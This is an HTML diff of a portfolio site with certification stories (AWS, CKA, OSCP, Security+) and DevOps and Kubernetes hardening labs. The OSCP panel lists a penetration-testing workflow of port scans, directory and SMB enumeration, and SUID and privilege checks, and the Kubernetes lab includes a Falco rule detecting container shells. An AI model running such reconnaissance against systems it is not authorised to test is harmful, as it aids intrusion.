+                <button onclick="closeModal('aws-cert')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div class="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4">
+                    <div class="flex items-center space-x-3 mb-2">
+                        <svg class="w-12 h-12 text-orange-500" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M6.763 10.036c0 .296.032.535.088.71.064.176.144.368.256.576.04.063.056.127.056.183 0 .08-.048.16-.152.24l-.503.335c-.072.048-.144.072-.208.072-.08 0-.16-.04-.239-.112-.112-.12-.207-.248-.279-.384-.072-.144-.144-.304-.224-.488-.56.66-1.263.988-2.095.988-.599 0-1.079-.17-1.431-.517-.353-.344-.528-.804-.528-1.375 0-.608.215-1.103.656-1.471.44-.368 1.023-.552 1.759-.552.247 0 .503.016.76.056.264.04.535.088.815.152v-.503c0-.52-.104-.887-.32-1.095-.208-.208-.568-.312-1.088-.312-.24 0-.487.032-.744.08-.255.048-.503.12-.735.2-.112.04-.191.064-.247.072-.056.008-.096.016-.128.016-.112 0-.168-.08-.168-.248v-.391c0-.128.016-.224.056-.28.04-.056.112-.104.216-.152.24-.127.527-.231.855-.328.336-.096.687-.144 1.063-.144.808 0 1.399.184 1.783.56.376.368.568.927.568 1.679v2.207zm-2.894 1.087c.24 0 .487-.04.751-.127.264-.088.496-.256.696-.512.12-.151.207-.32.256-.506.048-.184.08-.407.08-.662v-.32c-.216-.047-.44-.087-.671-.111-.231-.024-.455-.04-.671-.04-.479 0-.831.096-1.055.287-.224.192-.336.463-.336.807 0 .328.08.575.247.743.16.175.431.255.743.255zm5.783 1.535c-.144 0-.24-.024-.304-.08-.064-.048-.12-.16-.168-.311L7.586 5.55c-.048-.16-.072-.264-.072-.32 0-.128.064-.2.191-.2h.783c.151 0 .255.025.311.08.064.048.112.16.16.312l1.343 5.295 1.247-5.295c.04-.16.088-.264.151-.312.064-.048.175-.08.319-.08h.64c.151 0 .255.025.319.08.064.048.12.16.151.312l1.264 5.358 1.383-5.358c.048-.16.104-.264.16-.312.063-.048.167-.08.311-.08h.743c.128 0 .2.065.2.2 0 .04-.009.08-.017.128-.008.048-.024.12-.056.216l-1.927 6.717c-.048.16-.104.263-.168.311-.064.056-.168.08-.312.08h-.687c-.151 0-.255-.024-.319-.08-.064-.048-.12-.159-.151-.311L13.48 7.558l-1.231 5.286c-.04.16-.088.264-.151.312-.064.056-.175.08-.32.08h-.687zm9.207.191c-.735 0-1.471-.088-2.127-.256-.655-.168-1.159-.368-1.511-.599-.127-.088-.215-.184-.247-.28-.032-.096-.056-.2-.056-.312v-.407c0-.168.064-.248.183-.248.048 0 .096.008.144.024.048.016.12.048.2.08.271.12.559.215.855.279.304.072.6.104.903.104.506 0 .895-.088 1.167-.264.271-.176.415-.423.415-.743 0-.216-.064-.4-.2-.543-.135-.144-.431-.272-.791-.4l-1.135-.36c-.575-.183-1-.455-1.247-.807-.247-.353-.375-.743-.375-1.168 0-.336.072-.631.216-.895.144-.264.336-.487.575-.671.24-.184.52-.32.848-.415.327-.096.679-.136 1.054-.136.144 0 .296.008.44.024.151.016.296.04.431.064.128.024.255.056.375.088.12.032.216.064.287.096.104.048.183.096.232.151.048.049.08.136.08.256v.375c0 .168-.064.256-.184.256-.063 0-.167-.024-.303-.08-.48-.216-1.023-.32-1.631-.32-.455 0-.815.072-1.055.216-.24.144-.36.368-.36.679 0 .216.072.407.215.559.144.151.44.287.808.415l1.111.36c.567.183.983.439 1.223.767.24.329.36.703.36 1.119 0 .343-.072.655-.207.927-.144.272-.336.511-.591.703-.248.2-.559.343-.927.447-.36.111-.767.167-1.222.167z"/>
+                        </svg>
+                        <div>
+                            <h3 class="text-xl font-mono font-semibold text-orange-500">AWS Certified Solutions Architect - Associate</h3>
+                            <p class="text-gray-400 text-sm">Earned: March 2024</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">My Journey</h4>
+                    <p class="leading-relaxed mb-4">
+                        My AWS certification journey started when I was working on a project that required migrating on-premises infrastructure to the cloud.
+                        I quickly realized that understanding AWS services at a deep level wasn't optional—it was essential for designing resilient, cost-effective solutions.
+                    </p>
+                    <p class="leading-relaxed mb-4">
+                        I spent 3 months preparing, combining hands-on labs with theoretical study. The key was building actual projects:
+                        deploying multi-tier applications, setting up VPCs with public/private subnets, implementing auto-scaling groups, and configuring S3 with CloudFront for static website hosting.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Key Projects I Built</h4>
+                    <div class="space-y-3">
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">1. High-Availability Web Application</h5>
+                            <p class="text-sm text-gray-400">
+                                Deployed a 3-tier web app with Application Load Balancer, EC2 Auto Scaling Groups across multiple AZs,
+                                RDS with Multi-AZ failover, and ElastiCache for session management.
+                            </p>
+                        </div>
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">2. Serverless Data Processing Pipeline</h5>
+                            <p class="text-sm text-gray-400">
+                                Built an event-driven architecture using S3, Lambda, DynamoDB, and SQS to process uploaded files asynchronously.
+                                Implemented dead-letter queues and CloudWatch alarms for monitoring.
+                            </p>
+                        </div>
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">3. Hybrid Cloud Network</h5>
+                            <p class="text-sm text-gray-400">
+                                Configured VPN connections between on-premises data center and AWS VPC, set up Direct Connect for low-latency connections,
+                                and implemented Transit Gateway for multi-VPC networking.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Study Resources</h4>
+                    <ul class="space-y-2 text-gray-400 list-disc list-inside">
+                        <li>AWS Well-Architected Framework documentation</li>
+                        <li>Adrian Cantrill's SAA-C03 course (highly recommended!)</li>
+                        <li>Hands-on labs with AWS Free Tier</li>
+                        <li>Practice exams from Tutorials Dojo</li>
+                    </ul>
+                </div>
+
+                <div class="bg-primary/10 border border-primary/30 rounded-lg p-4">
+                    <p class="font-mono text-sm text-gray-300">
+                        <span class="text-secondary">$</span> aws sts get-caller-identity<br>
+                        <span class="text-gray-500"># This certification opened doors to architecting cloud solutions at scale</span>
+                    </p>
+                </div>
+
+                <!-- Series Navigation -->
+                <div id="aws-cert-series-nav"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CKA Certification Modal -->
+    <div id="cka-cert" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">Certified Kubernetes Administrator Story</h2>
+                <button onclick="closeModal('cka-cert')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div class="bg-blue-500/10 border border-blue-500/30 rounded-lg p-4">
+                    <div class="flex items-center space-x-3">
+                        <svg class="w-12 h-12 text-blue-500" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10.204 14.35l.007.01-.999 2.413a5.171 5.171 0 0 1-2.075-2.597l2.578-.437.004.005a.44.44 0 0 1 .484.606zm-.833-2.129a.44.44 0 0 0 .173-.756l.002-.011-1.996-1.599a5.18 5.18 0 0 0-.342 3.528l2.168-.372-.005-.01a.44.44 0 0 0-.001-.78zm8.341-3.584a.44.44 0 0 0 .609-.031l.004-.005 1.91-1.505a5.191 5.191 0 0 0-3.671-1.315l-.039 2.647.006.001a.44.44 0 0 0 .18.208zm-1.904 2.73a.44.44 0 0 0 .145-.77l.003-.005-.604-2.441a5.19 5.19 0 0 0-2.628 1.997l2.084 1.217-.001.011a.44.44 0 0 0 .999-.009zm-5.488-1.958a.44.44 0 0 0 .35-.736l-.004-.005-1.651-2.074a5.183 5.183 0 0 0-2.656 2.008l2.625 1.476.006-.001a.44.44 0 0 0 .33-.668zm-3.338 6.121l.008.009.02 2.465a5.185 5.185 0 0 0 3.474-.89l-1.612-2.05-.002.001a.44.44 0 0 0-.717-.007l-.171.472zm8.657-5.093a.44.44 0 0 0-.411-.763l-.008.002-2.635.459a5.194 5.194 0 0 0 .035 3.649l2.594-1.517.002-.009a.44.44 0 0 0 .423-.821zm-.964 4.784l.006.009 1.602 2.056a5.173 5.173 0 0 0 2.06-2.601l-2.578-.438-.004.005a.44.44 0 0 0-.609.031l-.477 .938zm-7.004-4.37a.44.44 0 0 0-.144.766l-.005.008.64 2.436a5.19 5.19 0 0 0 2.63-1.99l-2.121-1.22zm7.046-1.175a.44.44 0 0 0 .015-.979l.007-.006-.604-2.381a5.183 5.183 0 0 0-3.522.899l1.626 2.06.004-.005a.44.44 0 0 0 .749.014l.725-1.602z"/>
+                        </svg>
+                        <div>
+                            <h3 class="text-xl font-mono font-semibold text-blue-500">Certified Kubernetes Administrator (CKA)</h3>
+                            <p class="text-gray-400 text-sm">Earned: June 2024</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">The Challenge</h4>
+                    <p class="leading-relaxed mb-4">
+                        The CKA exam is notorious for being 100% hands-on—no multiple choice questions. You have 2 hours to solve 15-20 real-world Kubernetes problems
+                        in a command-line environment. This meant I couldn't just memorize theory; I needed muscle memory for kubectl commands and troubleshooting workflows.
+                    </p>
+                    <p class="leading-relaxed mb-4">
+                        I prepared for 4 months, spending at least 2 hours daily in my home lab. I built a 6-node cluster using kubeadm,
+                        broke things intentionally, and learned to fix them under time pressure.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Hands-On Practice Labs</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono overflow-x-auto"><code># Lab 1: Cluster Setup with kubeadm
+$ kubeadm init --pod-network-cidr=10.244.0.0/16
+$ kubectl apply -f https://raw.githubusercontent.com/flannel-io/flannel/master/Documentation/kube-flannel.yml
+
+# Lab 2: RBAC Configuration
+$ kubectl create serviceaccount jenkins
+$ kubectl create rolebinding jenkins-admin --clusterrole=admin --serviceaccount=default:jenkins
+
+# Lab 3: Troubleshooting Failed Pods
+$ kubectl get pods -n production
+$ kubectl describe pod webapp-7d8f4c9b-xk2r9
+$ kubectl logs webapp-7d8f4c9b-xk2r9 --previous
+
+# Lab 4: Backup & Restore etcd
+$ ETCDCTL_API=3 etcdctl snapshot save /backup/etcd-snapshot.db \
+  --endpoints=https://127.0.0.1:2379 \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Exam Day Tips</h4>
+                    <div class="space-y-2">
+                        <div class="flex items-start space-x-2">
+                            <span class="text-secondary mt-1">▸</span>
+                            <p class="text-gray-400">Use kubectl aliases: <code class="bg-dark-900 px-2 py-1 rounded text-secondary">alias k=kubectl</code></p>
+                        </div>
+                        <div class="flex items-start space-x-2">
+                            <span class="text-secondary mt-1">▸</span>
+                            <p class="text-gray-400">Master kubectl imperative commands to save time</p>
+                        </div>
+                        <div class="flex items-start space-x-2">
+                            <span class="text-secondary mt-1">▸</span>
+                            <p class="text-gray-400">Use <code class="bg-dark-900 px-2 py-1 rounded text-secondary">--dry-run=client -o yaml</code> to generate manifests quickly</p>
+                        </div>
+                        <div class="flex items-start space-x-2">
+                            <span class="text-secondary mt-1">▸</span>
+                            <p class="text-gray-400">Practice with killer.sh simulator (included with exam registration)</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-secondary/10 border border-secondary/30 rounded-lg p-4">
+                    <p class="font-mono text-sm text-gray-300">
+                        <span class="text-primary">$</span> kubectl get nodes<br>
+                        <span class="text-green-500">NAME STATUS ROLES AGE VERSION</span><br>
+                        <span class="text-gray-400">master-01 Ready control-plane 120d v1.28.0</span><br>
+                        <span class="text-gray-400">worker-01 Ready &lt;none&gt; 120d v1.28.0</span><br>
+                        <span class="text-gray-400">worker-02 Ready &lt;none&gt; 120d v1.28.0</span>
+                    </p>
+                </div>
+
+                <!-- Series Navigation -->
+                <div id="cka-cert-series-nav"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OSCP Modal -->
+    <div id="oscp-cert" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">OSCP: Try Harder Journey</h2>
+                <button onclick="closeModal('oscp-cert')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div class="bg-red-500/10 border border-red-500/30 rounded-lg p-4">
+                    <div class="flex items-center space-x-3">
+                        <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                        <div>
+                            <h3 class="text-xl font-mono font-semibold text-red-500">Offensive Security Certified Professional (OSCP)</h3>
+                            <p class="text-gray-400 text-sm">Earned: September 2024</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">The Most Challenging Certification</h4>
+                    <p class="leading-relaxed mb-4">
+                        OSCP is not just an exam—it's a rite of passage in cybersecurity. The motto "Try Harder" isn't just a catchphrase;
+                        it's what you'll tell yourself at 3 AM when you've been stuck on a box for 6 hours.
+                    </p>
+                    <p class="leading-relaxed mb-4">
+                        The exam is a brutal 24-hour challenge where you must compromise multiple machines in an isolated network,
+                        escalate privileges, capture flags, and write a professional penetration testing report. I failed my first attempt—and that failure taught me more than any success ever could.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">My Preparation Strategy</h4>
+                    <div class="space-y-4">
+                        <div>
+                            <h5 class="font-mono font-semibold text-primary mb-2">Phase 1: Fundamentals (2 months)</h5>
+                            <ul class="text-gray-400 space-y-1 ml-4">
+                                <li>• Completed all PWK lab machines (50+ boxes)</li>
+                                <li>• Mastered enumeration workflows (nmap, gobuster, enum4linux)</li>
+                                <li>• Practiced buffer overflow exploits (stack-based BOF)</li>
+                                <li>• Studied privilege escalation techniques (Linux & Windows)</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h5 class="font-mono font-semibold text-primary mb-2">Phase 2: Practice Platforms (3 months)</h5>
+                            <ul class="text-gray-400 space-y-1 ml-4">
+                                <li>• HackTheBox: Rooted 40+ machines (TJ Null's OSCP list)</li>
+                                <li>• Proving Grounds Practice: Completed all OSCP-like boxes</li>
+                                <li>• VulnHub: Old classics like Kioptrix, SickOs, Stapler</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h5 class="font-mono font-semibold text-primary mb-2">Phase 3: Exam Simulation (1 month)</h5>
+                            <ul class="text-gray-400 space-y-1 ml-4">
+                                <li>• Timed challenges mimicking exam conditions</li>
+                                <li>• Report writing practice</li>
+                                <li>• Note-taking with CherryTree and KeepNote</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Sample Enumeration Workflow</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono overflow-x-auto"><code># Initial Port Scan
+$ nmap -p- -sV -sC -T4 -oN full_scan.txt 192.168.1.100
+
+# Web Enumeration
+$ gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# SMB Enumeration
+$ enum4linux -a 192.168.1.100
+$ smbclient -L //192.168.1.100 -N
+
+# Linux Privilege Escalation
+$ LinEnum.sh
+$ sudo -l
+$ find / -perm -4000 -type f 2>/dev/null
+
+# Windows Privilege Escalation
+$ whoami /priv
+$ accesschk.exe -uwcqv "Authenticated Users" *</code></pre>
+                    </div>
+                </div>
+
+                <div class="bg-red-500/10 border border-red-500/30 rounded-lg p-4">
+                    <p class="font-mono text-sm text-gray-300">
+                        <span class="text-secondary">$</span> cat proof.txt<br>
+                        <span class="text-primary">d73jf82nf9s82nf72nf9s8dnf92nf</span><br><br>
+                        <span class="text-gray-500"># After 23 hours and 45 minutes, I finally got the last flag.</span><br>
+                        <span class="text-gray-500"># The feeling was indescribable. Try Harder! 🔥</span>
+                    </p>
+                </div>
+
+                <!-- Series Navigation -->
+                <div id="oscp-cert-series-nav"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security+ Modal -->
+    <div id="security-plus" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">CompTIA Security+ Foundation</h2>
+                <button onclick="closeModal('security-plus')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div class="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
+                    <div class="flex items-center space-x-3">
+                        <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                        <div>
+                            <h3 class="text-xl font-mono font-semibold text-green-500">CompTIA Security+ (SY0-601)</h3>
+                            <p class="text-gray-400 text-sm">Earned: January 2024</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">My First Security Certification</h4>
+                    <p class="leading-relaxed mb-4">
+                        Security+ was my entry point into cybersecurity. While I had DevOps experience, I wanted to formalize my security knowledge
+                        and understand the fundamentals: cryptography, network security, identity management, and risk assessment.
+                    </p>
+                    <p class="leading-relaxed mb-4">
+                        This certification gave me the vocabulary and frameworks to communicate security concepts effectively.
+                        It covers a broad range of topics—from understanding different types of attacks to implementing security controls.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Key Topics Mastered</h4>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">Threats & Vulnerabilities</h5>
+                            <ul class="text-sm text-gray-400 space-y-1">
+                                <li>• Social engineering attacks</li>
+                                <li>• Malware types and behaviors</li>
+                                <li>• Application & network attacks</li>
+                                <li>• Vulnerability scanning & assessment</li>
+                            </ul>
+                        </div>
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">Architecture & Design</h5>
+                            <ul class="text-sm text-gray-400 space-y-1">
+                                <li>• Network segmentation strategies</li>
+                                <li>• Zero trust architecture</li>
+                                <li>• Cloud security concepts</li>
+                                <li>• Secure DevOps practices</li>
+                            </ul>
+                        </div>
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">Implementation</h5>
+                            <ul class="text-sm text-gray-400 space-y-1">
+                                <li>• PKI and certificate management</li>
+                                <li>• Authentication protocols (SAML, OAuth)</li>
+                                <li>• Secure network design</li>
+                                <li>• Endpoint protection solutions</li>
+                            </ul>
+                        </div>
+                        <div class="bg-dark-900 border border-secondary/20 rounded-lg p-4">
+                            <h5 class="font-mono font-semibold text-primary mb-2">Operations & Incident Response</h5>
+                            <ul class="text-sm text-gray-400 space-y-1">
+                                <li>• SIEM and log analysis</li>
+                                <li>• Incident response procedures</li>
+                                <li>• Digital forensics basics</li>
+                                <li>• Disaster recovery planning</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
+                    <p class="font-mono text-sm">
+                        <span class="text-primary">Why This Matters:</span> Security+ gave me the foundation to build on with advanced certifications like OSCP.
+                        It's vendor-neutral, so the knowledge applies everywhere—whether you're securing AWS, Azure, or on-prem infrastructure.
+                    </p>
+                </div>
+
+                <!-- Series Navigation -->
+                <div id="security-plus-series-nav"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LocalStack Lab Modal -->
+    <div id="lab-localstack" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">Hands-On: LocalStack CI/CD Pipeline</h2>
+                <button onclick="closeModal('lab-localstack')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Project Overview</h4>
+                    <p class="leading-relaxed">
+                        This project demonstrates how to build a complete CI/CD pipeline using LocalStack for local AWS development.
+                        The goal is to test infrastructure changes locally before deploying to production, saving costs and speeding up development cycles.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Architecture</h4>
+                    <div class="bg-dark-900 border border-primary/20 rounded-lg p-6">
+                        <pre class="text-sm text-gray-300 font-mono"><code>┌─────────────────────────────────────────────┐
+│         LocalStack CI/CD Pipeline            │
+├─────────────────────────────────────────────┤
+│                                             │
+│  Git Push → GitHub Actions                  │
+│      ↓                                      │
+│  Terraform Plan (LocalStack)                │
+│      ↓                                      │
+│  Run Tests                                  │
+│      ↓                                      │
+│  Ansible Configure                          │
+│      ↓                                      │
+│  Deploy to LocalStack S3 + Lambda           │
+│                                             │
+└─────────────────────────────────────────────┘</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Step 1: Setup LocalStack</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># docker-compose.yml
+version: '3.8'
+services:
+  localstack:
+    image: localstack/localstack:latest
+    ports:
+      - "4566:4566"
+    environment:
+      - SERVICES=s3,lambda,dynamodb,apigateway
+      - DEBUG=1
+      - DATA_DIR=/tmp/localstack/data
+    volumes:
+      - "./localstack:/tmp/localstack"
+      - "/var/run/docker.sock:/var/run/docker.sock"
+
+# Start LocalStack
+$ docker-compose up -d
+
+# Verify services are running
+$ awslocal s3 ls</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Step 2: Infrastructure as Code (Terraform)</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># main.tf
+provider "aws" {
+  region                      = "us-east-1"
+  access_key                  = "test"
+  secret_key                  = "test"
+  skip_credentials_validation = true
+  skip_metadata_api_check     = true
+  skip_requesting_account_id  = true
+
+  endpoints {
+    s3      = "http://localhost:4566"
+    lambda  = "http://localhost:4566"
+  }
+}
+
+resource "aws_s3_bucket" "app_bucket" {
+  bucket = "my-app-bucket"
+}
+
+resource "aws_lambda_function" "api" {
+  filename      = "lambda.zip"
+  function_name = "my-api-function"
+  role          = aws_iam_role.lambda_role.arn
+  handler       = "index.handler"
+  runtime       = "nodejs18.x"
+}
+
+# Apply to LocalStack
+$ terraform init
+$ terraform plan
+$ terraform apply</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Step 3: Automated Testing</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># test_infrastructure.py
+import boto3
+import pytest
+
+@pytest.fixture
+def s3_client():
+    return boto3.client(
+        's3',
+        endpoint_url='http://localhost:4566',
+        aws_access_key_id='test',
+        aws_secret_access_key='test'
+    )
+
+def test_bucket_exists(s3_client):
+    buckets = s3_client.list_buckets()
+    bucket_names = [b['Name'] for b in buckets['Buckets']]
+    assert 'my-app-bucket' in bucket_names
+
+def test_lambda_invocation():
+    lambda_client = boto3.client(
+        'lambda',
+        endpoint_url='http://localhost:4566',
+        aws_access_key_id='test',
+        aws_secret_access_key='test'
+    )
+    response = lambda_client.invoke(
+        FunctionName='my-api-function',
+        InvocationType='RequestResponse'
+    )
+    assert response['StatusCode'] == 200
+
+# Run tests
+$ pytest test_infrastructure.py -v</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Step 4: CI/CD Pipeline (GitHub Actions)</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># .github/workflows/cicd.yml
+name: LocalStack CI/CD
+
+on: [push]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Start LocalStack
+        run: |
+          docker-compose up -d
+          sleep 10
+
+      - name: Terraform Init & Apply
+        run: |
+          terraform init
+          terraform apply -auto-approve
+
+      - name: Run Tests
+        run: |
+          pip install pytest boto3
+          pytest test_infrastructure.py
+
+      - name: Teardown
+        if: always()
+        run: docker-compose down</code></pre>
+                    </div>
+                </div>
+
+                <div class="bg-primary/10 border border-primary/30 rounded-lg p-4">
+                    <h5 class="font-mono font-semibold text-primary mb-2">What You'll Learn</h5>
+                    <ul class="text-gray-400 space-y-1">
+                        <li>✓ Local AWS development workflow</li>
+                        <li>✓ Infrastructure as Code with Terraform</li>
+                        <li>✓ Automated testing of cloud resources</li>
+                        <li>✓ CI/CD pipeline design</li>
+                        <li>✓ Cost-effective development practices</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Kubernetes Security Lab Modal -->
+    <div id="lab-k8s-security" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">Hands-On: Kubernetes Security Hardening</h2>
+                <button onclick="closeModal('lab-k8s-security')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Lab Objective</h4>
+                    <p class="leading-relaxed">
+                        Learn to secure a Kubernetes cluster from the ground up. This lab covers RBAC, Pod Security Standards, Network Policies,
+                        and runtime security monitoring—essential skills for production Kubernetes deployments.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">1. RBAC: Least Privilege Access</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Create a service account for a developer
+$ kubectl create serviceaccount developer-sa -n development
+
+# Create a role with limited permissions
+$ kubectl create role developer-role \
+  --verb=get,list,watch \
+  --resource=pods,services,deployments \
+  -n development
+
+# Bind the role to the service account
+$ kubectl create rolebinding developer-binding \
+  --role=developer-role \
+  --serviceaccount=development:developer-sa \
+  -n development
+
+# Test permissions
+$ kubectl auth can-i delete pods --as=system:serviceaccount:development:developer-sa -n development
+# Output: no</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">2. Pod Security Standards</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Apply Pod Security Standard to namespace
+$ kubectl label namespace production \
+  pod-security.kubernetes.io/enforce=restricted \
+  pod-security.kubernetes.io/warn=restricted
+
+# Secure pod manifest
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secure-app
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 2000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+  - name: app
+    image: myapp:1.0
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop:
+          - ALL</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">3. Network Policies</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Deny all ingress traffic by default
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-all-ingress
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+
+# Allow specific traffic only
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-frontend-to-backend
+  namespace: production
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  policyTypes:
+    - Ingress
+  ingress:
+    - from:
+      - podSelector:
+          matchLabels:
+            app: frontend
+      ports:
+        - protocol: TCP
+          port: 8080</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">4. Runtime Security with Falco</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Install Falco
+$ helm repo add falcosecurity https://falcosecurity.github.io/charts
+$ helm install falco falcosecurity/falco \
+  --namespace falco-system \
+  --create-namespace
+
+# Custom Falco rule to detect shell in container
+- rule: Shell spawned in container
+  desc: Detect shell execution in container
+  condition: >
+    spawned_process and container and
+    proc.name in (bash, sh, zsh)
+  output: >
+    Shell spawned in container
+    (user=%user.name container=%container.name image=%container.image.repository)
+  priority: WARNING
